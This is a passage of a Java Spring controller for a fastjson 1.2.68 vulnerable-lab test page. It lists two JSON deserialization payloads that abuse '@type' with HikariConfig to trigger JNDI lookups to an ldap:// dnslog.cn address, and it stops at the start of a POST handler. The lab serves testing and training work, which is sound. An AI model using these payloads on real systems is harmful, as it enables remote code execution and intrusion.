...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.68"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.68 靶场测试页", "/fastjson1.2.68-process", new String[]{
                "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://fastjson1.2.68-process.dnslog.cn/Calc\"}",
                "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://fastjson1.2.68-process.dnslog.cn/Calc\"}"
        }, "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}");
    }

    @PostMapping("/fastjson1.2.68-process")
    public String fastjson1_2_68_process(@RequestBody String data) {
